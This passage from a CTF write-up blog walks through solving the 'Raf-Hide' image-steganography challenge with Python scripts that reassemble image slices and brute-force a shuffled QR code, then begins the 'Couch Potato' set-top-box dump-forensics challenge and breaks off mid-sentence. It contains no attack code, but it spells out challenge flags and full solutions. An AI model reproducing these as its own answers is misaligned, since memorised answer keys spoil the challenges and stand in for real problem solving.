data-src=\"https://github.com/4n6nk8s/quals-2023-write-ups/raw/main/Raf-Hide/210.png\" width=\"450\" /> \n</p>\n<p>Ok Let’s focus on the last images as the author said. This is will be better for us. Wait what?! We found a 2 pastebin links and 2 images putted as hint for us. And of couse a rabbit hole(Fake Flag)</p>\n<p float=\"center\">\n  <img data-src=\"https://github.com/4n6nk8s/quals-2023-write-ups/raw/main/Raf-Hide/372.png\" width=\"320\"style=\"margin-right:10px;\" />\n  <img data-src=\"https://github.com/4n6nk8s/quals-2023-write-ups/raw/main/Raf-Hide/377.png\" width=\"320\"style=\"margin-right:10px;\" /> \n  <img data-src=\"https://github.com/4n6nk8s/quals-2023-write-ups/raw/main/Raf-Hide/381.png\" width=\"320\"style=\"margin-right:10px;\" /> \n</p>\n<p>Let’s check the content of the 2 pastebin links and see what we have!</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Advertising flash, it&#x27;s time to relax and rest.</span><br><span class=\"line\">This pastebin is the solution to your problem </span><br><span class=\"line\">Those links will Absolutely help you </span><br><span class=\"line\"> </span><br><span class=\"line\">https://4n6nk8s.tech</span><br><span class=\"line\">https://anas-cherni.me/</span><br><span class=\"line\">https://ironbyte.me/</span><br><span class=\"line\">https://yassine-belkhadem.tech/ ( Don&#x27;t waste your time with this link)</span><br><span class=\"line\">https://github.com/M0ngi</span><br><span class=\"line\">https://soter14.tech/</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">Thi is the FLAG: GG_Tr0ll1ng_1s_MY_G4mE_!</span><br><span class=\"line\"> </span><br><span class=\"line\">https://github.com/Mohamed-Rafraf</span><br><span class=\"line\">https://github.com/adamlahbib</span><br><span class=\"line\">https://www.linkedin.com/in/mohamed-rafraf/</span><br><span class=\"line\">https://www.linkedin.com/in/adamlahbib/</span><br><span class=\"line\">https://www.linkedin.com/in/anascherni/</span><br><span class=\"line\">https://www.linkedin.com/in/yassine-belkhadem-396266204/</span><br><span class=\"line\">https://www.linkedin.com/in/m0ngi/</span><br><span class=\"line\">https://www.linkedin.com/in/mohamed-ali-ouachani-00a452237/</span><br><span class=\"line\">https://www.linkedin.com/in/rania-midaoui-b0163a1bb/</span><br><span class=\"line\">https://www.linkedin.com/in/mohamed-ayadi-5a10621a4/</span><br><span class=\"line\">https://www.linkedin.com/in/yassine-belarbi-853303208/</span><br></pre></td></tr></table></figure>\n<p>There is another fake flag &amp; links for the blogs of the author and his team members! Yeah It’s SOter14 team. Let’s Check the other one. Maybe it will help</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">6 &lt;--&gt; 29</span><br><span class=\"line\">15 &lt;--&gt; 25</span><br><span class=\"line\">11 &lt;--&gt; 34</span><br><span class=\"line\">10 &lt;--&gt; 24</span><br><span class=\"line\">1 &lt;--&gt; 23</span><br><span class=\"line\">14 &lt;--&gt; 35</span><br><span class=\"line\">2 &lt;--&gt; 19</span><br><span class=\"line\">17 &lt;--&gt; 33</span><br><span class=\"line\">3 &lt;--&gt; 32</span><br><span class=\"line\">8 &lt;--&gt; 27</span><br><span class=\"line\">13 &lt;--&gt; 31</span><br><span class=\"line\">0 &lt;--&gt; 18</span><br><span class=\"line\">7 &lt;--&gt; 20</span><br><span class=\"line\">5 &lt;--&gt; 28</span><br><span class=\"line\">12 &lt;--&gt; 30</span><br></pre></td></tr></table></figure>\n<p>Absolutely this thing will help but we still didn’t know how this text file will help us! Let’s understand the explanation putted on the other frames.</p>\n<p><img data-src=\"https://github.com/4n6nk8s/quals-2023-write-ups/raw/main/Raf-Hide/377.png\" alt=\"\"></p>\n<p>The author told us that he split the image to many slices and put each slice in an empty unique image!!! We get it! The random lines are tiny pieces of unique image!</p>\n<p>But how can we collect this slice and re-order them to get the original? The lines are ordered randomly? Let’s think.</p>\n<h3 id=\"collect-the-pieces-and-recover-the-orginal-image\"><a class=\"markdownIt-Anchor\" href=\"#collect-the-pieces-and-recover-the-orginal-image\">#</a> collect the pieces and recover the orginal image</h3>\n<p>The solution is simple. That’s assume that the white color have a  <code>0 value</code>  and the black color have  <code>1 value</code> . We can sum the pixels of all the images with this concept to recover the image, right?</p>\n<blockquote>\n<p>We know that our image size is 720x720 (The resolution of our video) and from our extracted images we know that we have 360 images that splitted to slices. which mean that every line present 2px (width) from the original image.</p>\n</blockquote>\n<p>Take a look at this script then!</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"></span><br><span class=\"line\">img=Image.new(<span class=\"string\">&#x27;1&#x27;</span>,(<span class=\"number\">720</span>,<span class=\"number\">720</span>),<span class=\"number\">255</span>)</span><br><span class=\"line\">imgpixs=img.load()</span><br><span class=\"line\"><span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">360</span>):</span><br><span class=\"line\">    name=<span class=\"string\">&quot;0&quot;</span>*(<span class=\"number\">3</span>-<span class=\"built_in\">len</span>(<span class=\"built_in\">str</span>(n+<span class=\"number\">1</span>)))+<span class=\"built_in\">str</span>(n+<span class=\"number\">1</span>)+<span class=\"string\">&quot;.png&quot;</span></span><br><span class=\"line\">    image=Image.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;data/&quot;</span>+name)</span><br><span class=\"line\">    image_pixs=image.load()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Image Number : &quot;</span>,n)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">720</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">720</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> image_pixs[i,j]!=<span class=\"number\">255</span>:</span><br><span class=\"line\">                imgpixs[i,j]=image_pixs[i,j]</span><br><span class=\"line\"></span><br><span class=\"line\">img.save(<span class=\"string\">&quot;Recovered.png&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>In this script we collect all the black pixels and ignore the white pixels. Because we generate a white image and we will fill it with the black color. Let’s recover the image now!!</p>\n<p>Bingo! There is a progress, we got this image!</p>\n<p><img data-src=\"https://github.com/4n6nk8s/quals-2023-write-ups/raw/main/Raf-Hide/recoverd.png\" alt=\"\"></p>\n<p>Oh god! It’s a broken QR code. How can we deal with this thing. Oh yeah! We have another clue! The author left this hint for us!</p>\n<p><img data-src=\"https://github.com/4n6nk8s/quals-2023-write-ups/raw/main/Raf-Hide/381.png\" alt=\"\"></p>\n<p>Oh cool! The author split the QRCode to small square and shuffle them in random order! We need to recover them. The squares are numeroted from 0 to n-1 pieces. This order will help us. Now We get the utility of the pastebin link!</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">6 &lt;--&gt; 29</span><br><span class=\"line\">15 &lt;--&gt; 25</span><br><span class=\"line\">11 &lt;--&gt; 34</span><br><span class=\"line\">10 &lt;--&gt; 24</span><br><span class=\"line\">1 &lt;--&gt; 23</span><br><span class=\"line\">14 &lt;--&gt; 35</span><br><span class=\"line\">2 &lt;--&gt; 19</span><br><span class=\"line\">17 &lt;--&gt; 33</span><br><span class=\"line\">3 &lt;--&gt; 32</span><br><span class=\"line\">8 &lt;--&gt; 27</span><br><span class=\"line\">13 &lt;--&gt; 31</span><br><span class=\"line\">0 &lt;--&gt; 18</span><br><span class=\"line\">7 &lt;--&gt; 20</span><br><span class=\"line\">5 &lt;--&gt; 28</span><br><span class=\"line\">12 &lt;--&gt; 3</span><br></pre></td></tr></table></figure>\n<p>This is will help us how re-order the QRCode. Let’s take a deep look now the the broken QRCode!.</p>\n<p>The QRCode is splitted by 6 in width and 6 in height. So each piece’s size is 120x120. And we have 36 pieces. It’s impossible to recover the image without the help of pastebin link. Let’s take this line for example  <code>0 &lt;--&gt; 18</code> , this link told us that the author switch the 1st piece with the 19th piece. (We Start counting from 0 due to the explanation). So we need to write a script that can order this QRCode! We need to recover it!</p>\n<p>Let’s put the content of the pastebin inside a textfile named  <code>help.txt</code>  and start write our solver.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"></span><br><span class=\"line\">W_SPLIT=<span class=\"number\">6</span></span><br><span class=\"line\">H_SPLIT=<span class=\"number\">6</span></span><br><span class=\"line\"></span><br><span class=\"line\">ASSEMBLED_IMAGE=<span class=\"string\">&quot;Assembled.png&quot;</span></span><br><span class=\"line\">SPLITTED_IMAGE=<span class=\"string\">&quot;Recovered.png&quot;</span></span><br><span class=\"line\">image= Image.<span class=\"built_in\">open</span>(SPLITTED_IMAGE)</span><br><span class=\"line\">width, height = image.size</span><br><span class=\"line\">pixels = image.load()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">change_chunk</span>(<span class=\"params\">index1,index2</span>):</span><br><span class=\"line\">    pos1=[]</span><br><span class=\"line\">    pos1.append(index1 % W_SPLIT)</span><br><span class=\"line\">    pos1.append(index1 // W_SPLIT)</span><br><span class=\"line\">    pos2=[]</span><br><span class=\"line\">    pos2.append(index2 % W_SPLIT)</span><br><span class=\"line\">    pos2.append(index2 // W_SPLIT)</span><br><span class=\"line\">    height_chunk=height // H_SPLIT</span><br><span class=\"line\">    width_chunk= width // W_SPLIT</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span> (width_chunk):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span> (height_chunk):</span><br><span class=\"line\">            aux= pixels[pos1[<span class=\"number\">0</span>]*width_chunk+i,pos1[<span class=\"number\">1</span>]*height_chunk+j]</span><br><span class=\"line\">            pixels[pos1[<span class=\"number\">0</span>]*width_chunk+i,pos1[<span class=\"number\">1</span>]*height_chunk+j]= pixels[pos2[<span class=\"number\">0</span>]*width_chunk+i,pos2[<span class=\"number\">1</span>]*height_chunk+j]</span><br><span class=\"line\">            pixels[pos2[<span class=\"number\">0</span>]*width_chunk+i,pos2[<span class=\"number\">1</span>]*height_chunk+j]= aux</span><br><span class=\"line\"></span><br><span class=\"line\">data=<span class=\"built_in\">open</span>(<span class=\"string\">&quot;help.txt&quot;</span>,<span class=\"string\">&quot;r&quot;</span>).read().split(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(data)-<span class=\"number\">1</span>):</span><br><span class=\"line\">    position=data[i].split(<span class=\"string\">&quot;&lt;--&gt;&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(position)</span><br><span class=\"line\">    change_chunk(<span class=\"built_in\">int</span>(position[<span class=\"number\">0</span>]),<span class=\"built_in\">int</span>(position[<span class=\"number\">1</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\">image.save(ASSEMBLED_IMAGE)</span><br></pre></td></tr></table></figure>\n<p>Yeah It works fine!! We recover the QRCode!</p>\n<p><img data-src=\"https://github.com/4n6nk8s/quals-2023-write-ups/raw/main/Raf-Hide/Assembled.png\" alt=\"\"></p>\n<p>But something is wrong here! It sills broken and We can’t scan it 😦. But why? are we have any problem with our solver?</p>\n<p>Ah No. I get it! We have 36 pieces and each line from  <code>help.txt</code>  have correspond to 2 pieces! So we have to find 18 lines, right ?</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@Securinets:~$ <span class=\"built_in\">wc</span> -l help.txt</span><br><span class=\"line\">15</span><br></pre></td></tr></table></figure>\n<p>Oh no we have 15 lines, So we have 6 pieces we need to re-order them by ourselves! Now I get why the Author said Help  <code>LITTLE BIIT</code> . He left the 6 pieces to deal with it.</p>\n<p>In this case we need to do a bruteforce to all the combinasions. We have 6 pieces, so we have 6! possibility<br>\nand 6! = 720 which is possible to deal with it using a python script. Let’s re-order the 6 pieces each time and try to scan the QRCode. Once the QRCode is readable, we will stop our program!</p>\n<p>Let’s get the flag now !!! Let’s DO IT NOW! We’re so close!</p>\n<p>So the 1st thing that we need to do it is that we need to get the index of missed pieces. The  <code>help.txt</code>  is the key!</p>\n<p>Let’s generate an array that have the order (index) of the missed pieces. Then we use our  <code>change_chunck()</code>  method and try all the combinaisons using the  <code>itertools</code> . Finally try to scan the QRCode each time using the  <code>qrtools</code></p>\n<p>Let’s install the qrtools first</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@Securinets:~$ sudo apt-get install python3-qrtools</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Now let’s write down our last script (I Hope) :</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"><span class=\"keyword\">import</span> qrtools</span><br><span class=\"line\"><span class=\"keyword\">from</span> itertools <span class=\"keyword\">import</span> permutations</span><br><span class=\"line\"></span><br><span class=\"line\">qr=qrtools.QR()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">missed_data</span>():</span><br><span class=\"line\">    not_missed=[]</span><br><span class=\"line\">    data=<span class=\"built_in\">open</span>(<span class=\"string\">&quot;help.txt&quot;</span>,<span class=\"string\">&quot;r&quot;</span>).read().split(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(data)-<span class=\"number\">1</span>):</span><br><span class=\"line\">        position=data[i].split(<span class=\"string\">&quot;&lt;--&gt;&quot;</span>)</span><br><span class=\"line\">        not_missed.append(<span class=\"built_in\">int</span>(position[<span class=\"number\">0</span>]))</span><br><span class=\"line\">        not_missed.append(<span class=\"built_in\">int</span>(position[<span class=\"number\">1</span>]))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(not_missed)</span><br><span class=\"line\">    missed=[]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">36</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> (i <span class=\"keyword\">in</span> not_missed):</span><br><span class=\"line\">            missed.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> missed</span><br><span class=\"line\"></span><br><span class=\"line\">chuncks=missed_data()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(chuncks)</span><br><span class=\"line\">H_SPLIT=<span class=\"number\">6</span></span><br><span class=\"line\">W_SPLIT=<span class=\"number\">6</span></span><br><span class=\"line\">SPLITTED_IMAGE=<span class=\"string\">&quot;Assembled.png&quot;</span></span><br><span class=\"line\">height,width=<span class=\"number\">720</span>,<span class=\"number\">720</span></span><br><span class=\"line\"></span><br><span class=\"line\">permutations=<span class=\"built_in\">list</span>(permutations(chuncks,<span class=\"number\">6</span>))</span><br><span class=\"line\">image=Image.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;Assembled.png&quot;</span>)</span><br><span class=\"line\">pixels=image.load()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">change_chunk</span>(<span class=\"params\">index1,index2</span>):</span><br><span class=\"line\">    pos1=[]</span><br><span class=\"line\">    pos1.append(index1 % W_SPLIT)</span><br><span class=\"line\">    pos1.append(index1 // W_SPLIT)</span><br><span class=\"line\">    pos2=[]</span><br><span class=\"line\">    pos2.append(index2 % W_SPLIT)</span><br><span class=\"line\">    pos2.append(index2 // W_SPLIT)</span><br><span class=\"line\">    height_chunk=height // H_SPLIT</span><br><span class=\"line\">    width_chunk= width // W_SPLIT</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span> (width_chunk):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span> (height_chunk):</span><br><span class=\"line\">            aux= pixels[pos1[<span class=\"number\">0</span>]*width_chunk+i,pos1[<span class=\"number\">1</span>]*height_chunk+j]</span><br><span class=\"line\">            pixels[pos1[<span class=\"number\">0</span>]*width_chunk+i,pos1[<span class=\"number\">1</span>]*height_chunk+j]= pixels[pos2[<span class=\"number\">0</span>]*width_chunk+i,pos2[<span class=\"number\">1</span>]*height_chunk+j]</span><br><span class=\"line\">            pixels[pos2[<span class=\"number\">0</span>]*width_chunk+i,pos2[<span class=\"number\">1</span>]*height_chunk+j]= aux</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[-] Trying to fix the QRCode and Getting the flag ...&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(permutations)):</span><br><span class=\"line\">    comb=<span class=\"built_in\">list</span>(permutations[i])</span><br><span class=\"line\">    change_chunk(comb[<span class=\"number\">0</span>],comb[<span class=\"number\">1</span>])</span><br><span class=\"line\">    change_chunk(comb[<span class=\"number\">2</span>],comb[<span class=\"number\">3</span>])</span><br><span class=\"line\">    change_chunk(comb[<span class=\"number\">4</span>],comb[<span class=\"number\">5</span>])</span><br><span class=\"line\">    image.save(<span class=\"string\">&quot;Final.png&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> qr.decode(<span class=\"string\">&quot;Final.png&quot;</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(qr.data)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<p>And we got the flag as an output Here!!! BINGO! We get the flag!</p>\n<p><img data-src=\"https://github.com/4n6nk8s/quals-2023-write-ups/raw/main/Raf-Hide/finally.png\" alt=\"\"></p>\n<p>And of course the QRCode is saved! And this is our QRCode!</p>\n<p><img data-src=\"https://github.com/4n6nk8s/quals-2023-write-ups/raw/main/Raf-Hide/Final.png\" alt=\"\"></p>\n<blockquote Every_Fr4Me_H4S_HiS_own_S7ory=\"\">\n<p>The Final flag is : Securinets</p>\n</blockquote>\n<h2 id=\"couch-potato\"><a class=\"markdownIt-Anchor\" href=\"#couch-potato\">#</a> Couch Potato</h2>\n<p><img data-src=\"https://i.imgur.com/jHut52F.png\" alt=\"\"></p>\n<p>It’s past one, I was probably sleeping in front of my screen, I’m not even sure if I was awake for a bit or not, I’m not even sure if I’m dreaming or not… All I know is that I left the device on my favorite channel and that piece of crap failed me. Agh I need to fix it now. It is no longer responding to the commands I give it, and it is no longer showing my favorite channel! I hate my life, can you help me fix it?</p>\n<p>I am looking for three stuff:</p>\n<ul>\n<li><em>What nonsense was I watching the night the device failed me?</em></li>\n<li><em>I might need the Up and Down key codes in NEC 32-bit format?</em></li>\n<li><em>The expiration date of my IPTV subscription.</em></li>\n</ul>\n<p>Flag formal: <strong>Securinets{show_name_00UP1234_DOWN1234_YYYYMMDD}</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9hZG1pZGEwdWk=\">adm &amp; mida0ui</span></p>\n<h3 id=\"attachment-2\"><a class=\"markdownIt-Anchor\" href=\"#attachment-2\">#</a> Attachment</h3>\n<p>A file called  <code>dump.bin</code>  was provided in a zip. Weighing 8 MB. Dating back to February the 1st, 2020. 1:07 AM.</p>\n<p>Another file is what seems to be an updated firmware for the device,  <code>Firmware.bin</code>  weighing 4 MB. And dating back to August the 25th, 2020.</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2RyaXZlL2ZvbGRlcnMvMVRHTkFPV0taWmJDelp1Vklta2xBMThJSF9jVXZ0a055P3VzcD1zaGFyaW5n\">Download Link</span></p>\n<h3 id=\"analysis\"><a class=\"markdownIt-Anchor\" href=\"#analysis\">#</a> Analysis</h3>\n<p>A Couch potato is a lazy guy that sits in front of the TV screen, indicating that we are dealing with a console, set-top-box STB or Digital Video Recorder DVR and not a PCI card satellite/Tuner card or a computer. The user mentioned that he was watching his favorite channel when he fall asleep which make it more likely an STB, or a receiver for simplicity.<br>\nThis also means that the show name we are looking for was broadcasted in his favorite channel.</p>\n<p>The user also mentioned that the device failed him, which means that the device is not responding to the commands he is sending to it. Kind of talking about a control unit, or that’s clearly a remote control that has some keys malfunctioning, specifically the UP and DOWN arrow keys as we know.</p>\n<p>On other hand, the user is suspecting that the IPTV subscription was the thing behind the interruption of his channel. This means that the IPTV subscription was a service provided by the device itself or maybe a third party service. This also means that the STB we’re dealing with is a hybrid device, meaning that it can receive satellite signals and also IPTV, making it a 2nd generation STB and there are plenty in the market today, for third world countries.</p>\n<p>However, the user could be mistaken as the channels that you can shortlist in the favorites are more likely to be satellite channels, hence the IPTV subscription is not the reason behind the interruption of his favorite channel rather than the satellite signal itself or the cardsharing service he is using.</p>\n<p>With all that in mind, we can start our information gathering phase.</p>\n<h3 id=\"information-gathering\"><a class=\"markdownIt-Anchor\" href=\"#information-gathering\">#</a> Information Gathering</h3>\n<p>TL;DR.</p>\n<p>The thing is devices like this are hard to find in UK, Europe and the US. Unlike Africa and Asia. That’s because in European countries and the US, they are mostly banned due to the fact that they are used for cardsharing and IPTV piracy. However, in Africa and Asia, they are still widely used and sold.</p>\n<p>So where to look? These devices are not open source nor they have some kind of documentation is to where to look in their ROMs. Satellite forums, subreddits, and Facebook groups are good resources and some deep search would yield some useful tools and details to deal with dump. We kind of need to know how the memory is splitted. The file is indeed a ROM/EEPROM snapshot, so it has a mapping of the memory. We just need to know where the information part is, channel list is, and applications or services are.</p>\n<p>The mapping generally includes the following:</p>\n<ul>\n<li>Bootloader</li>\n<li>Kernel or maincode</li>\n<li>User data</li>\n<li>Menu</li>\n<li>…</li>\n</ul>\n<p>Each at specific offsets and specific lengths. The user data is the most important part as it contains the channel list.</p>\n<p>Keep in mind that if the IPTV subscription was provided by the device itself, then the expiration date could be stored in the device itself or their renewal website. If the IPTV subscription was provided by a third party service, then the expiration date is stored in the third party service database or user panel. In both cases, we need to find the device serial number or MAC address to be able to identify the device and the user. I believe that how they are likely to be stored in the memory dump rather than a plain expiration date.</p>\n<h3 id=\"resources\"><a class=\"markdownIt-Anchor\" href=\"#resources\">#</a> Resources</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2F0ZWxsaXRlcy5jby51ay9mb3J1bXMv\">https://www.satellites.co.uk/forums/</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL3NhdGVsbGl0ZS8=\">https://www.reddit.com/r/satellite/</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHVuaXNpYS1zYXQuY29tL2ZvcnVtcy8=\">https://www.tunisia-sat.com/forums/</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zYXQtdW5pdmVyc2UuY29tLw==\">https://sat-universe.com/</span></li>\n</ul>\n<h3 id=\"tools\"><a class=\"markdownIt-Anchor\" href=\"#tools\">#</a> Tools</h3>\n<p>HexWorkshop / HxD Editor is a good tool to start with. It is a hex editor that can be used to view and edit files in hexadecimal and binary formats. It is a good tool to start with as it can be used to view the memory dump and search for strings. It can also be used to search for patterns and hex values.</p>\n<h3 id=\"writeup-2\"><a class=\"markdownIt-Anchor\" href=\"#writeup-2\">#</a> Writeup</h3>\n<p>First, let’s investigate the dump file.</p>\n<p><code>NCRCBootloader</code>  is the start point, which is the bootloader used for these chipsets as indicated in the Hex Editor screen:</p>\n<ul>\n<li>ALI3329</li>\n<li>ALI3606</li>\n<li>ALI3601</li>\n<li>ALI3511</li>\n<li>ALI3510</li>\n<li>ALI3516</li>\n<li>ALI3618</li>\n<li>ALI3821</li>\n</ul>\n<p><img data-src=\"https://i.imgur.com/vSB9IGX.png\" alt=\"\"></p>\n<p>Devices with those chipset have these brands <em>Starsat, Sunplus, Tiger, StarMax, Geant, Mediastar, QMAX, AzAmerica, Samsat and many more…</em></p>\n<p>And all of their built-in subscriptions are part of <strong>Gosat</strong>.</p>\n<p>Now, to actually find the specific brand and model, we need to inspect the firmware update file.</p>\n<p>To clear things up, the memory dump serves for user data mainly the channels and services as I said while the firmware update file will indicate the remote control being used.</p>\n<p>The memory dump is a mapping and can be splitted manually and further investigated. However the firmware is encrypted, you can tell by a first 